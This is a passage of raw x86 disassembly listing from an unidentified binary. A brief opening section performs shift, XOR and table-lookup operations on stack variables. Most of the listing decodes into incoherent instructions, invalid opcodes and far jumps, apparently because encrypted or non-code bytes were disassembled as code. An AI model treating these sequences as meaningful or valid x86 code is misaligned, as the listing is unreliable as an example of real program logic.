  404ea4:	jno    0x404e76
  404ea6:	add    DWORD PTR [edx+0x43b7178d],eax
  404eac:	out    dx,eax
  404ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eae:	mov    ebx,0x758ff839
  404eb3:	loopne 0x404e7f
  404eb5:	inc    esp
  404eb6:	loop   0x404e3d
  404eb8:	imul   edi,DWORD PTR [ebx+0x2e],0x27e62d9
  404ebf:	in     eax,0xb2
  404ec1:	mov    ch,dl
  404ec3:	lds    eax,FWORD PTR [edi]
  404ec5:	push   ecx
  404ec6:	punpcklbw mm6,DWORD PTR [ebx]
  404ec9:	(bad)  
  404eca:	xor    edx,edx
  404ecc:	or     eax,edx
  404ece:	mov    cl,BYTE PTR [eax+ecx*1]
  404ed1:	mov    eax,DWORD PTR [ebp-0x34]
  404ed4:	or     BYTE PTR [eax],cl
  404ed6:	mov    eax,DWORD PTR [ebp-0x10]
  404ed9:	mov    ecx,DWORD PTR [ebp-0xc]
  404edc:	shrd   eax,ecx,0x2
  404ee0:	shr    ecx,0x2
  404ee3:	mov    ecx,DWORD PTR [ebp-0x10]
  404ee6:	mov    edx,DWORD PTR [ebp-0xc]
  404ee9:	xor    eax,edi
  404eeb:	shl    ecx,0x1e
  404eee:	xor    edx,edx
  404ef0:	or     eax,edx
  404ef2:	lea    eax,[ebp+eax*1-0x4]
  404ef6:	mov    DWORD PTR [ebp-0x34],eax
  404ef9:	mov    eax,DWORD PTR [ebp-0x10]
  404efc:	mov    ecx,DWORD PTR [ebp-0xc]
  404eff:	shrd   eax,ecx,0x2
  404f03:	shr    ecx,0x2
  404f06:	mov    ecx,DWORD PTR [ebp-0x10]
  404f09:	mov    edx,DWORD PTR [ebp-0xc]
  404f0c:	xor    eax,edi
  404f0e:	shl    ecx,0x1e
  404f11:	mov    ecx,DWORD PTR [ebp-0x14]
  404f14:	xor    edx,edx
  404f16:	or     eax,edx
  404f18:	mov    cl,BYTE PTR [eax+ecx*1]
  404f1b:	mov    eax,DWORD PTR [ebp-0x34]
  404f1e:	add    BYTE PTR [eax],cl
  404f20:	mov    eax,DWORD PTR [ebp-0x60]
  404f23:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f26:	shrd   eax,ecx,0x2
  404f2a:	shr    ecx,0x2
  404f2d:	mov    ecx,DWORD PTR [ebp-0x60]
  404f30:	mov    edx,DWORD PTR [ebp-0x5c]
  404f33:	xor    eax,edi
  404f35:	xor    edx,edx
  404f37:	or     eax,edx
  404f39:	lea    eax,[ebp+eax*1-0x4]
  404f3d:	mov    DWORD PTR [ebp-0x34],eax
  404f40:	mov    eax,DWORD PTR [ebp-0x60]
  404f43:	shl    ecx,0x1e
  404f46:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f49:	shrd   eax,ecx,0x2
  404f4d:	shr    ecx,0x2
  404f50:	mov    ecx,DWORD PTR [ebp-0x60]
  404f53:	mov    edx,DWORD PTR [ebp-0x5c]
  404f56:	xor    eax,edi
  404f58:	xor    edx,edx
  404f5a:	or     eax,edx
  404f5c:	mov    edx,DWORD PTR [ebp+0x14]
  404f5f:	shl    ecx,0x1e
  404f62:	mov    ecx,DWORD PTR [ebp-0x14]
  404f65:	mov    cl,BYTE PTR [eax+ecx*1]
  404f68:	mov    eax,DWORD PTR [ebp-0x34]
  404f6b:	or     BYTE PTR [eax],cl
  404f6d:	jmp    0x40530e
  404f72:	mov    DWORD PTR [edx],ecx
  404f74:	push   0xabac68c5
  404f79:	mov    al,BYTE PTR [edi+0x14920a40]
  404f7f:	xlat   BYTE PTR ds:[bx]
  404f81:	jecxz  0x404f41
  404f83:	adc    DWORD PTR [esi-0x413b4242],edi
  404f89:	mov    esi,0x942350be
  404f8e:	xor    DWORD PTR [esi-0x68],ebx
  404f91:	mov    esi,0x820d1821
  404f96:	lods   al,BYTE PTR ds:[esi]
  404f97:	rep lods eax,DWORD PTR ds:[esi]
  404f99:	loopne 0x404ff6
  404f9b:	lea    edi,[ebp+0x3]
  404f9e:	sub    DWORD PTR [ebx],edi
  404fa0:	cli    
  404fa1:	jo     0x404f73
  404fa3:	retf   
  404fa4:	nop
  404fa5:	rol    bl,0xc1
  404fa8:	icebp  
  404fa9:	push   DWORD PTR [ebx]
  404fab:	std    
  404fac:	loope  0x404fe1
  404fae:	push   ss
  404faf:	lods   al,BYTE PTR ds:[esi]
  404fb0:	sahf   
  404fb1:	mov    ch,0xfd
  404fb3:	out    dx,al
  404fb4:	sahf   
  404fb5:	sub    al,0x29
  404fb7:	adc    al,0xac
  404fb9:	retf   
  404fba:	sbb    DWORD PTR [ebx+0x13],0x2b9b5f9
  404fc1:	xor    ecx,edi
  404fc3:	repnz and eax,0x1ee6563b
  404fc9:	arpl   WORD PTR [eax],si
  404fcb:	fcmovb st,st(2)
  404fcd:	cmp    DWORD PTR [ebx-0x36dc0507],ebx
  404fd3:	jnp    0x40500a
  404fd5:	(bad)  
  404fd6:	js     0x404f58
  404fd8:	stos   BYTE PTR es:[edi],al
  404fd9:	and    edx,DWORD PTR [esi-0x70]
  404fdc:	mov    edi,DWORD PTR [ecx-0x1e91473f]
  404fe2:	pop    ecx
  404fe3:	ret    
  404fe4:	call   0x4932:0x43f54951
  404feb:	pop    ebx
  404fec:	(bad)  
  404fed:	xor    BYTE PTR [ebx-0x5a],al
  404ff0:	leave  
  404ff1:	dec    ebp
  404ff2:	mov    ah,0x56
  404ff4:	cs pop ebp
  404ff6:	aaa    
  404ff7:	(bad)  
  404ff8:	sbb    bh,bh
  404ffa:	push   ebx
  404ffb:	ins    BYTE PTR es:[edi],dx
  404ffc:	adc    al,BYTE PTR [edi-0x43]
  404fff:	rcr    BYTE PTR [edi+0x48],cl
  405002:	pop    eax
  405003:	or     eax,0x69cf92ba
  405008:	mov    fs,edi
  40500a:	arpl   dx,dx
  40500c:	jmp    0x405011
  40500e:	or     bh,ah
  405010:	nop
  405011:	(bad)  
  405012:	fisub  WORD PTR [eax-0x50]
  405015:	sbb    eax,0xec6d0863
  40501a:	dec    ebp
  40501b:	js     0x404fa8
  40501d:	mov    DWORD PTR [edi+ebp*4+0x4e6392e0],esi
  405024:	es xchg edx,eax
  405026:	leave  
  405027:	daa    
  405028:	or     eax,0xc8e82949
  40502d:	mov    ds:0xd170ed69,eax
  405032:	xchg   ebx,eax
  405033:	outs   dx,BYTE PTR ds:[esi]
  405034:	int    0x5b
  405036:	fiadd  DWORD PTR [edx-0x5dff9faf]
  40503c:	test   eax,0x46752ebb
  405041:	repz adc dh,bh
  405044:	or     eax,0x6e6dd7d5
  405049:	add    esp,DWORD PTR [ebx+0x52]
  40504c:	cmp    al,BYTE PTR [ecx+eiz*4-0xb6497d6]
  405053:	rcr    cl,cl
  405055:	jo     0x4050d3
  405057:	test   al,0x4c
  405059:	mov    esi,0xb350fd03
  40505e:	and    dl,ch
  405060:	bound  edi,QWORD PTR [eax+eiz*2-0x68]
  405064:	ss cmp eax,0x84dea468
  40506a:	repnz mov edx,0xa2e5ba60
  405070:	pop    eax
  405071:	push   esi
  405072:	das    
  405073:	mov    al,0x11
  405075:	mov    ch,BYTE PTR [ebx]
  405077:	and    eax,0x17442db
  40507c:	adc    DWORD PTR [esi+0x28],0xffffffab
  405080:	jo     0x4050e6
  405082:	sub    edi,DWORD PTR [edi+0x67bf73d1]
  405088:	in     al,0x64
  40508a:	mov    ebx,0x7dff5512
  40508f:	int3   
  405090:	push   0x73
  405092:	loopne 0x405021
  405094:	xor    DWORD PTR [edx+0x37],edi
  405097:	out    0xc3,al
  405099:	cmp    DWORD PTR [ebx+0x249c54c6],0x1d81acdd
  4050a3:	stos   BYTE PTR es:[edi],al
  4050a4:	imul   ecx,ebx,0xefa4f006
  4050aa:	not    BYTE PTR [esi+edi*4+0x79]
  4050ae:	mov    eax,ds:0x1c483561
  4050b3:	inc    esp
  4050b4:	mov    dl,0x60
  4050b6:	mov    cs,WORD PTR ds:0xc02f921b
  4050bc:	fcom   QWORD PTR [edi+0x76]
  4050bf:	data16 mov ds:0x45585d53,al
  4050c5:	iret   
  4050c6:	jbe    0x4050b9
  4050c8:	cmp    edi,DWORD PTR [edx+0x30b00fdb]
  4050ce:	adc    al,0x2a
  4050d1:	out    0xcc,al
  4050d3:	push   cs
  4050d4:	sbb    BYTE PTR [ebp+esi*2-0x12b703b],cl
  4050db:	mov    ebp,0x62fa6877
  4050e0:	inc    ebx
  4050e1:	pop    edi
  4050e2:	push   edi
  4050e3:	mov    bl,0xeb
  4050e5:	scas   al,BYTE PTR es:[edi]
  4050e6:	xchg   ecx,eax
  4050e7:	in     eax,dx
  4050e8:	cmp    BYTE PTR [edx-0x5d487934],ch
  4050ee:	jp     0x405138
  4050f0:	adc    bl,cl
  4050f2:	mov    eax,0x7bb90c63
  4050f7:	(bad)  
  4050f8:	mov    ecx,0xdd9a4ce8
  4050fd:	push   0xe59ec87c
  405102:	stc    
  405103:	sbb    ecx,DWORD PTR [esi]
  405105:	push   edi
  405106:	mov    dh,0x31
  405108:	lods   eax,DWORD PTR ds:[esi]
  405109:	sahf   
  40510a:	mov    ecx,0x789c0194
  40510f:	in     eax,0xb0
  405111:	sbb    ecx,esi
  405113:	mov    eax,0x3d0e7019
  405118:	xchg   ecx,eax
  405119:	and    eax,0xd719dfc
  40511e:	ss jge 0x40516e
  405121:	mov    BYTE PTR [edi+0x3a548d12],al
  405127:	scas   eax,DWORD PTR es:[edi]
  405128:	jae    0x405164
  40512a:	popa   
  40512b:	ds sbb eax,0x505d1ff8
  405131:	shr    ebx,cl
  405133:	xchg   ebx,eax
  405134:	and    DWORD PTR [ebx*8+0x4f86caf7],ebx
  40513b:	dec    ecx
  40513c:	clc    
  40513d:	or     eax,0x222a553d
  405142:	imul   esi,DWORD PTR [edx+0x16e7a465],0x2dde14d9
  40514c:	repnz cwde 
  40514e:	sar    BYTE PTR [ecx+0x4d],0x2d
  405152:	test   al,0x94
  405154:	and    bl,bl
  405156:	mov    BYTE PTR [ebp-0x309ca47f],al
  40515c:	xor    edi,DWORD PTR [eax]
  40515e:	in     al,0x1c
  405160:	lahf   
  405161:	mov    esi,DWORD PTR [edx-0x74b60433]
  405167:	cdq    
  405168:	outs   dx,BYTE PTR ds:[esi]
  405169:	ins    BYTE PTR es:[edi],dx
  40516a:	in     al,dx
  40516b:	adc    BYTE PTR [edx],bh
  40516d:	cdq    
  40516e:	sub    al,0x73
  405170:	jge    0x4051da
  405172:	inc    esp
  405173:	jl     0x4051eb
  405175:	imul   ebx,ebp,0x7b69d7c9
  40517b:	and    edi,edx
  40517d:	pop    edx
  40517e:	adc    esp,esp
  405180:	fwait
  405181:	or     al,0x31
  405183:	jbe    0x405155
  405185:	movq   QWORD PTR [ecx-0x52a6e359],mm5
  40518c:	xor    al,0xb1
  40518e:	shl    bh,cl
  405190:	test   DWORD PTR [ebx+0x6],ebp
  405193:	and    BYTE PTR [edx-0x70774307],bl
  405199:	jns    0x4051e5
  40519b:	in     eax,dx
  40519c:	retf   0x6f1f
  40519f:	jae    0x40519f
  4051a1:	in     al,0xcd
  4051a3:	mov    dh,0xdf
  4051a5:	cmp    ecx,DWORD PTR [esi-0x1b]
  4051a8:	sbb    BYTE PTR [eax+0x37de61f],0xf1
  4051af:	ins    BYTE PTR es:[edi],dx
  4051b0:	mov    esi,0xccc7388c
  4051b5:	jae    0x4051af
  4051b7:	mov    al,bl
  4051b9:	shl    BYTE PTR [ebp+0x4b],1
  4051bc:	stc    
  4051bd:	jl     0x405236
  4051bf:	jo     0x40522c
  4051c1:	pop    edi
  4051c2:	mov    esp,0x7fe2a902
  4051c7:	xchg   esp,eax
  4051c8:	mov    ah,0x82
  4051ca:	sbb    eax,0xb8b30680
  4051cf:	std    
  4051d0:	out    0xf9,eax
  4051d2:	out    0xb3,al
  4051d4:	sub    eax,DWORD PTR [edi-0x4a3d0d1]
  4051da:	loope  0x4051a4
  4051dc:	arpl   WORD PTR [edi+0x2b],ax
  4051df:	jle    0x405170
  4051e1:	jns    0x4051ac
  4051e3:	les    edi,FWORD PTR [ebx+0x5b903024]
  4051e9:	jbe    0x405262
  4051eb:	sbb    DWORD PTR [eax-0x54],0xffffffe4
  4051ef:	ret    
  4051f0:	out    0xeb,eax
  4051f2:	xlat   BYTE PTR ds:[ebx]
  4051f3:	mov    WORD PTR ds:0x3712d5eb,ds
  4051f9:	push   es
  4051fa:	pop    eax
  4051fb:	xchg   ecx,eax
  4051fc:	pusha  
  4051fd:	jne    0x4051b0
  4051ff:	jmp    0x736:0x73fef41b
  405206:	push   es
  405207:	ret    
  405208:	sbb    edx,DWORD PTR [ebx]
  40520a:	xchg   BYTE PTR [edx],cl
  40520c:	xchg   ebp,eax
  40520d:	mov    dh,0xde
  40520f:	adc    DWORD PTR [ebx],ecx
  405211:	mov    esi,0xd58025e2
  405216:	or     BYTE PTR [edx],dh
  405218:	(bad)  
  405219:	sub    dh,BYTE PTR fs:[eax+edx*1-0x559b071b]
  405221:	dec    ebx
  405222:	pop    esp
  405223:	push   ds
  405224:	mov    eax,esi
  405226:	mov    esp,0x4268170b
  40522b:	mov    dh,0x56
  40522d:	xchg   DWORD PTR [eax+0x38],edi
  405230:	xor    al,0xb2
  405232:	rcl    BYTE PTR [ecx-0x24],0x2
  405236:	pusha  
  405237:	jge    0x4051e1
  405239:	mov    ch,0x23
  40523b:	retf   0x49f9
  40523e:	mov    dl,dl
  405240:	push   esi
  405241:	stos   DWORD PTR es:[edi],eax
  405242:	and    eax,0x6bbc67a4
  405247:	pop    ecx
  405248:	lock hlt 
  40524a:	sub    eax,0x1bc885b
  40524f:	jne    0x4051e7
  405251:	push   ebx
  405252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405253:	jb     0x405235
  405255:	mov    cl,0x18
  405257:	out    dx,al
  405258:	pop    ss
  405259:	gs and DWORD PTR ds:[ebp-0x2259edcb],edi
  405261:	jge    0x4052cb
  405263:	arpl   di,cx
  405265:	les    ebp,FWORD PTR [edi]
  405267:	add    DWORD PTR [esi],ebp
  405269:	mov    al,ds:0x6affcc88
  40526e:	test   eax,0xf627920b
  405273:	pop    ebx
  405274:	sahf   
  405275:	push   ecx
  405276:	jle    0x4052b4
  405278:	inc    ebp
  405279:	xchg   edx,eax
  40527a:	lahf   
  40527b:	sbb    eax,0x5c8525c8
  405280:	test   al,0x18
  405282:	(bad)  
  405283:	test   al,0x8c
  405285:	gs push cs
  405287:	mov    eax,0xb0db9cf1
  40528c:	add    ch,BYTE PTR [esi]
  40528e:	fld    TBYTE PTR [ebx]
  405290:	cmp    cl,ch
  405292:	add    eax,0x7848ed10
  405297:	sti    
  405298:	fnstsw WORD PTR [ecx]
  40529a:	add    al,0x21
  40529c:	aaa    
  40529d:	inc    esp
  40529e:	jecxz  0x40531d
  4052a0:	aas    
  4052a1:	sub    dh,dl
  4052a3:	push   ecx
  4052a4:	sar    edi,1
  4052a6:	fiadd  DWORD PTR [edx]
  4052a8:	mov    DWORD PTR ds:0xee56f974,ebp
  4052ae:	inc    ebx
  4052af:	push   ds
  4052b0:	mov    ch,0x8
  4052b2:	pusha  
  4052b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052b4:	mov    ebp,0xa25e77ba
  4052b9:	sub    al,0xfd
  4052bb:	cmp    eax,0x5af1d5e4
  4052c0:	jbe    0x4052e9
  4052c2:	imul   ebp,DWORD PTR [eax],0x62
  4052c5:	dec    esp
  4052c6:	sbb    esp,DWORD PTR [ebx-0x73da3434]
  4052cc:	shl    DWORD PTR [edx],1
  4052ce:	loop   0x4052cc
  4052d0:	xchg   DWORD PTR [eax],esp
  4052d2:	inc    esp
  4052d3:	shl    BYTE PTR [edx],cl
  4052d5:	repnz adc eax,0x794b5c43
  4052db:	das    
  4052dc:	(bad)  [edx]
  4052de:	mov    edx,0xf9b0955
  4052e3:	xor    DWORD PTR [edi+ebx*2],ebx
  4052e6:	dec    eax
  4052e7:	xor    al,0x13
  4052e9:	in     al,0x32
  4052eb:	aaa    
  4052ec:	mov    ds:0x5fc748ea,eax
  4052f1:	or     esi,esp
  4052f3:	outs   dx,DWORD PTR ds:[esi]
  4052f4:	sbb    dh,dh
  4052f6:	push   ecx
  4052f7:	rol    DWORD PTR [ecx+0x3d],0x93
  4052fb:	sbb    BYTE PTR [eax],0x7c
  4052fe:	fsubr  QWORD PTR [esi+0x3c7c9c3e]
  405304:	nop
  405305:	stos   DWORD PTR es:[edi],eax
  405306:	mov    BYTE PTR [edx-0x27],0x74
  40530a:	sbb    BYTE PTR [edx+0x458b9b7d],ch
  405310:	adc    BYTE PTR [ebx-0x2e53f038],cl
  405316:	add    al,cl
  405318:	loopne 0x405338
  40531a:	shr    edx,0x2
  40531d:	mov    DWORD PTR [ebp+0x14],edx
  405320:	mov    DWORD PTR [ebp+0x14],eax
  405323:	xor    edx,edx
  405325:	mov    eax,ecx
  405327:	jmp    0x4056c8
  40532c:	sub    eax,0x846700b2
  405331:	jnp    0x4052e9
  405333:	mov    esp,0xe3d964fe
  405338:	scas   eax,DWORD PTR es:[edi]
  405339:	inc    BYTE PTR [esi]
  40533b:	xchg   edx,eax
  40533c:	mov    ebp,0xbdbebe17
  405341:	les    edi,FWORD PTR [esi-0x1a06b042]
  405347:	fcom   QWORD PTR [ecx]
  405349:	cld    
  40534a:	push   edi
  40534b:	push   ebp
  40534c:	pop    edx
  40534d:	pop    esp
  40534e:	in     al,dx
  40534f:	push   ds
  405350:	not    dh
  405352:	inc    eax
  405353:	outs   dx,DWORD PTR ds:[esi]
  405354:	(bad)  
  405355:	mov    al,ds:0x18d6084d
  40535a:	lods   al,BYTE PTR ds:[esi]
  40535b:	cmp    al,0x56
  40535d:	in     eax,dx
  40535e:	cmc    
  40535f:	mov    ecx,0xce0caf4d
  405364:	xchg   ebx,eax
  405365:	stos   DWORD PTR es:[edi],eax
  405366:	sub    DWORD PTR [ecx-0x5da11473],ebp
  40536c:	shl    BYTE PTR [eax-0x27f1a0f6],1
  405372:	mov    eax,ds:0xfa64e763
  405377:	mov    bh,0xd9
  405379:	outs   dx,BYTE PTR ds:[esi]
  40537a:	push   ss
  40537b:	inc    eax
  40537c:	and    esp,DWORD PTR ss:[ebp-0xa]
  405380:	xchg   edi,eax
  405381:	fld    TBYTE PTR ds:0xd28d0290
  405387:	fisub  DWORD PTR [edx]
  405389:	mov    WORD PTR gs:[ebx-0x175c1f59],?
  405390:	xor    ecx,esp
  405392:	sub    DWORD PTR ds:0x5ffe527c,edx
  405398:	(bad)  
  405399:	jmp    0x76ca:0xae653b3e
  4053a0:	adc    cl,BYTE PTR [ebp+0x70]
  4053a3:	mov    bl,0xad
  4053a5:	xchg   ebp,eax
  4053a6:	jno    0x405406
  4053a8:	lahf   
  4053a9:	call   0xf89f26e9
  4053ae:	in     eax,0x49
  4053b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053b1:	idiv   bl
  4053b3:	mov    dh,0xa5
  4053b5:	jbe    0x40535d
  4053b7:	jae    0x40537f
  4053b9:	shr    BYTE PTR [ecx+eax*2-0x63],1
  4053bd:	retf   0xa5be
  4053c0:	popa   
  4053c1:	push   ss
  4053c2:	adc    al,BYTE PTR [edi-0x9c2b21f]
  4053c8:	mov    eax,0x60be807a
  4053cd:	sti    
  4053ce:	test   eax,0x2e62227
  4053d3:	add    ebp,ebx
  4053d5:	adc    ebx,DWORD PTR [edi+0x38]
  4053d8:	xchg   ecx,eax
  4053d9:	xchg   esi,eax
  4053da:	lods   al,BYTE PTR ds:[esi]
  4053db:	imul   eax,edi,0xbd91e95e
  4053e1:	xor    DWORD PTR [ecx+0x3829ee96],ecx
  4053e7:	out    dx,al
  4053e8:	scas   al,BYTE PTR es:[edi]
  4053e9:	shl    DWORD PTR [esi],0xb5
  4053ec:	mov    ah,ch
  4053ee:	int    0x7f
  4053f0:	sbb    esi,esp
  4053f2:	or     eax,0xd334a83e
  4053f7:	or     cl,ah
  4053f9:	jne    0x405389
  4053fb:	aaa    
  4053fc:	push   ebp
  4053fd:	xchg   esi,eax
  4053fe:	js     0x405410
  405400:	adc    ebp,DWORD PTR [edi+ecx*4+0xf0bbb9a]
  405407:	xchg   ebp,eax
  405408:	cmp    al,0x26
  40540a:	pushf  
  40540b:	stos   DWORD PTR es:[edi],eax
  40540c:	sbb    eax,0x1d599a6b
  405411:	xchg   edx,eax
  405412:	sbb    esp,esp
  405414:	push   ss
  405415:	jecxz  0x405425
  405417:	lahf   
  405418:	lods   eax,DWORD PTR ds:[esi]
  405419:	xchg   BYTE PTR [edx+ebp*8-0x30],ah
  40541d:	dec    esi
  40541e:	mov    ds:0x43e1d865,al
  405423:	adc    al,0x75
  405425:	popf   
  405426:	gs xchg ecx,eax
  405428:	mov    esp,0x12b7a3a5
  40542d:	rcr    DWORD PTR [eax+eiz*1+0x38],0xe1
  405432:	cmovae ebp,DWORD PTR [eax-0x1]
  405436:	and    al,0x31
  405438:	mov    esi,0x68a3f839
  40543d:	jne    0x4053e6
  40543f:	xchg   esi,eax
  405440:	xor    BYTE PTR [ebx],dh
  405442:	js     0x405412
  405444:	(bad)
  405448:	mov    esi,0x12b044b1
  40544d:	adc    BYTE PTR [edx-0xc],bl
  405450:	xchg   ebx,eax
  405451:	adc    DWORD PTR [esi],edi
  405453:	adc    BYTE PTR [ebp+0x422341e5],bl
  405459:	mov    ebx,0xa1258fe2
  40545e:	(bad)  
  40545f:	jmp    0x13e2:0xe6f4f5f
  405466:	mov    esp,0x191b24a6
  40546b:	test   al,0x72
  40546d:	imul   ebx,eax,0xffffffb1
  405470:	push   ebp
  405471:	ret    
  405472:	inc    edx
  405473:	ins    BYTE PTR es:[edi],dx
  405474:	add    eax,0xf28bbce7
  405479:	lds    esi,FWORD PTR [edx+0x556bc6ee]
  40547f:	jae    0x405430
  405481:	xchg   esi,eax
  405482:	inc    ebp
  405483:	stc    
  405484:	cdq    
  405485:	test   ch,cl
  405487:	loopne 0x405435
  405489:	inc    ecx
  40548a:	mov    esp,DWORD PTR [edi]
  40548c:	aad    0x19
  40548e:	mov    ch,0x7a
  405490:	cmp    DWORD PTR [eax],0xffffffd7
  405493:	xor    BYTE PTR [ecx],al
  405495:	(bad)  
  405496:	adc    BYTE PTR [esi+0x34dfaf61],0x19
  40549d:	fistp  DWORD PTR [ecx-0x3c28c7ad]
  4054a3:	jo     0x4054ee
  4054a5:	nop
  4054a6:	jge    0x40549f
  4054a8:	push   edx
  4054a9:	ins    BYTE PTR es:[edi],dx
  4054aa:	pop    eax
  4054ab:	(bad)  
  4054ac:	xlat   BYTE PTR ds:[ebx]
  4054ad:	mov    ebx,0xf9e7e2a4
  4054b2:	mov    bh,0x38
  4054b4:	sub    bh,ch
  4054b6:	int    0x85
  4054b8:	imul   edx,DWORD PTR [edx-0x3b940e6f],0x16
  4054bf:	stc    
  4054c0:	and    BYTE PTR [esi+0x72bd8efa],al
  4054c6:	or     eax,0xed6a9796
  4054cb:	leave  
  4054cc:	adc    BYTE PTR [esi+0x3159cd66],dl
  4054d2:	lods   al,BYTE PTR ds:[esi]
  4054d3:	imul   edx,DWORD PTR [edi],0x69
  4054d6:	(bad)  
  4054d7:	dec    ebx
  4054d8:	in     eax,dx
  4054d9:	(bad)  
  4054da:	ins    DWORD PTR es:[edi],dx
  4054db:	jae    0x4054d9
  4054dd:	sbb    ecx,edx
  4054df:	mov    bh,0xa5
  4054e1:	test   BYTE PTR [ebp+0x422ab2c8],ah
  4054e7:	mov    ebp,0x48e0db91
  4054ec:	adc    al,0xcf
  4054ee:	add    ah,BYTE PTR [esi-0x67fa5789]
  4054f4:	mov    ah,0x9
  4054f6:	mov    ecx,0xd1f02fb5
  4054fb:	sub    eax,0x3121d520
  405500:	xor    eax,0x123cd38b
  405505:	inc    edi
  405506:	jbe    0x40556b
  405508:	adc    eax,edx
  40550a:	and    al,0x5d
  40550c:	mov    ecx,0xc55374c6
  405511:	push   cs
  405512:	test   DWORD PTR [edi],0x1f95a463
  405518:	cwde   
  405519:	mov    ch,0xa9
  40551b:	cli    
  40551c:	xor    al,0x8c
  40551e:	push   esp
  40551f:	outs   dx,DWORD PTR ds:[esi]
  405520:	mov    ds:0xc2095c7b,al
  405525:	cli    
  405526:	sbb    bl,bl
  405528:	(bad)  
  40552a:	pop    ds
  40552b:	push   ss
  40552c:	jns    0x4055ab
  40552e:	test   BYTE PTR ds:0x78f188e2,bl
  405534:	dec    eax
  405535:	jnp    0x405523
  405537:	mov    WORD PTR [esi+ebp*8-0x7bc08635],es
  40553e:	or     DWORD PTR ds:0x5b875fe3,ecx
  405544:	popa   
  405545:	push   ebp
  405546:	jno    0x40552a
  405548:	out    0x1a,eax
  40554a:	imul   edi,DWORD PTR [eax],0x66
  40554d:	sub    al,0xee
  40554f:	pop    es
  405550:	je     0x4055bc
  405552:	out    0x7d,eax
  405554:	xor    DWORD PTR [ecx+esi*4],0xf5191e57
  40555b:	test   al,0x51
  40555d:	or     BYTE PTR ss:[eax],ch
  405560:	cs mov ebp,0x61a2a222
  405566:	shl    DWORD PTR [edi],1
  405568:	aas    
  405569:	pop    ds
  40556a:	je     0x405503
  40556c:	fnstcw WORD PTR [ecx+edi*2-0x41]
  405570:	mov    esi,esi
  405572:	mov    bh,0x5e
  405574:	repnz inc esp
  405576:	sub    al,0x97
  405578:	push   edi
  405579:	sbb    ah,ch
  40557b:	mov    cl,0x4e
  40557d:	xchg   edx,eax
  40557e:	in     eax,0xcd
  405580:	lds    edi,FWORD PTR [esi]
  405582:	sbb    edi,ecx
  405584:	mul    BYTE PTR [ebp-0x9f80eca]
  40558a:	pop    ebp
  40558b:	inc    edx
  40558c:	dec    ebp
  40558d:	fdivr  QWORD PTR [eax-0x24cf8ff0]
  405593:	lahf   
  405594:	xchg   edi,eax
  405595:	loopne 0x40558e
  405597:	inc    esi
  405598:	pop    ds
  405599:	adc    dh,BYTE PTR [bp+si+0x5a]
  40559d:	jmp    ebx
  40559f:	fst    st(6)
  4055a1:	loopne 0x4055ec
  4055a3:	out    dx,al
  4055a4:	imul   esi,DWORD PTR [ecx-0x3f0b9f43],0x1c61fbf3
  4055ae:	stc    
  4055af:	mov    edx,0x47ff6563
  4055b4:	mov    fs,WORD PTR [edx+0x7fa21092]
  4055ba:	outs   dx,BYTE PTR ds:[esi]
  4055bb:	dec    esp
  4055bc:	je     0x40562b
  4055be:	les    ecx,FWORD PTR [ebx]
  4055c0:	call   0x1ed03d41
  4055c5:	mov    ebp,0xa1b06eec
  4055ca:	and    eax,0x157e1640
  4055cf:	repz add DWORD PTR [ecx+0x4d5b3a28],eax
  4055d6:	push   ecx
  4055d7:	fs hlt 
  4055d9:	pop    eax
  4055da:	out    0x50,eax
  4055dc:	fdiv   QWORD PTR [ecx]
  4055de:	pusha  
  4055df:	mov    BYTE PTR [ebp+edx*1-0x7c579520],dh
  4055e6:	mul    BYTE PTR [edi+0x61]
  4055e9:	mov    WORD PTR cs:[edx+0x49],?
  4055ed:	push   ds
  4055ee:	ret    0x46e9
  4055f1:	xchg   edx,eax
  4055f2:	inc    esp
  4055f3:	inc    edi
  4055f4:	ins    DWORD PTR es:[edi],dx
  4055f5:	(bad)  [eax]
  4055f7:	je     0x4055a0
  4055f9:	in     eax,0x4a
  4055fb:	sbb    ah,0xda
  4055fe:	pop    edi
  4055ff:	aas    
  405600:	es push ebx
  405602:	ins    BYTE PTR es:[edi],dx
  405603:	inc    BYTE PTR [edi-0x4e]
  405606:	add    BYTE PTR [eax],al
  405608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405609:	jmp    0x4055be
  40560b:	xchg   esi,esi
  40560d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40560e:	arpl   WORD PTR ds:0x33fb0dca,cx
  405614:	dec    eax
  405615:	mov    ebx,0xa32df144
  40561a:	and    edx,0x6b
  40561d:	xchg   esi,eax
  40561e:	mov    ds:0xff573114,al
  405623:	jl     0x40564f
  405625:	adc    DWORD PTR [ebp-0x7b],0x32
  405629:	pop    ss
  40562a:	pop    ecx
  40562b:	push   edx
  40562c:	dec    eax
  40562d:	add    DWORD PTR [edx+ecx*2+0x39d9e50b],edi
  405634:	pop    es
  405635:	cmp    ch,0x88
  405638:	cs inc ebp
  40563a:	jge    0x4055f7
  40563c:	lahf   
  40563d:	mov    eax,ds:0x3546dc17
  405642:	cdq    
  405643:	xchg   DWORD PTR [esi-0x15fd21be],eax
  405649:	rol    DWORD PTR [ebx],1
  40564b:	mov    ds:0x64927ced,al
  405650:	pushf  
  405651:	sti    
  405652:	inc    ecx
  405653:	pop    eax
  405654:	fdivr  QWORD PTR ss:[ebp-0x5f]
  405658:	pop    es
  405659:	test   al,0xaf
  40565b:	retf   0x1b68
  40565e:	fs and edi,esi
  405661:	xor    eax,0x35560985
  405666:	sbb    al,0x5
  405668:	mov    esi,0x11390741
  40566d:	loope  0x4056b5
  40566f:	fld    st(0)
  405671:	das    
  405672:	fidiv  WORD PTR [ebp-0x15]
  405675:	or     esp,DWORD PTR [ebx]
  405677:	sbb    cl,ah
  405679:	loop   0x405634
  40567b:	xor    cl,dl
  40567d:	int3   
  40567e:	pop    edi
  40567f:	xchg   edi,eax
  405680:	add    ebp,DWORD PTR [ebx-0x73233d27]
  405686:	mov    ch,BYTE PTR [ebx+edx*2-0x5584194c]
  40568d:	outs   dx,BYTE PTR ds:[esi]
  40568e:	repnz add BYTE PTR [eax-0xb116778],al
  405695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405696:	xor    ebp,esp
  405698:	adc    eax,0x7c4b4c94
  40569d:	(bad)  [ecx+0x22e40659]
  4056a3:	adc    eax,DWORD PTR ds:0x107fb2d
